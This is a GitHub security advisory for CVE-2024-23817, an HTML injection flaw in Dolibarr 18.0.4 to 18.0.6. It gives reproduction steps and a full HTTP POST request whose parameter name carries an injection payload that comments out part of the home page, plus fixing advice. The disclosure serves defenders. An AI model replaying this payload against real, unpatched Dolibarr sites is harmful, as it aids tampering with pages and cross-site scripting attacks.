# [H] Dolibarr Application Home Page has HTML injection vulnerability

## Summary
Severity: High
Advisory: GHSA-7947-48q7-cp5m
CVE: CVE-2024-23817
CWE: CWE-79, CWE-80
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2024-04-18
Source: https://github.com/advisories/GHSA-7947-48q7-cp5m
Type: github-advisory

## Affected
- Packagist: `dolibarr/dolibarr` — affected >=18.0.4 <18.0.7

## Details
### Summary
Observed a HTML Injection vulnerbaility in the Home page of Dolibarr Application. This vulnerability allows an attacker to inject arbitrary HTML tags and manipulate the rendered content in the application's response. Specifically, I was able to successfully inject a new HTML tag into the returned document and, as a result, was able to comment out some part of the Dolibarr App Home page HTML code. This behavior can be exploited to perform various attacks like Cross-Site Scripting (XSS).

### Details
1. Navigate to the login page of Dolibarr application.
2. Submit a login request with the following payload in an arbitrarily supplied body parameter: "**u70ea%22%3e%3c!--HTML_Injection_By_Sai"=1**

**HTTP Post Request:**
POST /dolibarr/index.php?mainmenu=home HTTP/1.1
Host: 192.168.37.129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.37.129/dolibarr/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 375
Origin: http://192.168.37.129
Connection: close
Cookie: <Redacted>
Upgrade-Insecure-Requests: 1

token=697c1f303ef1976a713eda01d20d8eab&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=5.5&tz_string=Asia%2FKolkata&dst_observed=0&dst_first=&dst_second=&screenwidth=1280&screenheight=587&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=admin&password=manikanta&u70ea%22%3e%3c!--HTML_Injection_By_Sai=1

3. Upon successful injection of the payload, some part of Home page HTML code was commented out.

**POC**
Kindly go through the below video for detailed steps:

https://user-images.githubusercontent.com/26869643/294010332-ff88d80b-cb26-4870-82d3-fb49f7ecc32f.mp4

**Remediation Suggestion**
Kindly validate and sanitize all user-supplied input, especially within HTML attributes, to prevent HTML injection attacks.
Implement proper output encoding when rendering user-provided data to ensure it is treated as plain text rather than executable HTML.

## References
- https://github.com/Dolibarr/dolibarr/security/advisories/GHSA-7947-48q7-cp5m
- https://nvd.nist.gov/vuln/detail/CVE-2024-23817
- https://github.com/Dolibarr/dolibarr
